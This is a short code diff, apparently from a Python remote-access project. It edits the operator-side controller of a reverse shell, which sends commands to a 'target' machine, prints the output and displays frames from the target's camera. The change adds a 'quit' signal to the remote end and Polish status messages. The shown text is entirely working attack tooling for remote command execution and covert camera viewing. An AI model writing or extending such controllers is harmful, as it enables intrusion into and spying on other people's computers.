@@ -112,15 +112,19 @@ def send_target_commands(connection):
     while True:
         try:
             command = input()
-            if len(str.encode(command)) > 0:
+            if command == 'quit':
+                print("Wysylanie zakonczenia")
+                connection.send(str.encode('q', "utf-8"))
+                print("Wysylano")
+                break
+            elif len(str.encode(command)) > 0:
                 connection.send(str.encode(command))
                 client_response = str(connection.recv(4096), "utf-8", "ignore")
                 print(client_response, end="")
-            if command == 'quit':
-                break
         except:
             print("Connection was lost")
             break
+    print("Reverse shell closed")
 
 
 def receiveCameraData(connection):
@@ -145,6 +149,7 @@ def receiveCameraData(connection):
         cv2.imshow('ImageWindow',frame)
         key = cv2.waitKey(1)
         if key == ord('q'):
+            connection.send(str.encode('q', "utf-8"))
             break
 
     cv2.destroyAllWindows()
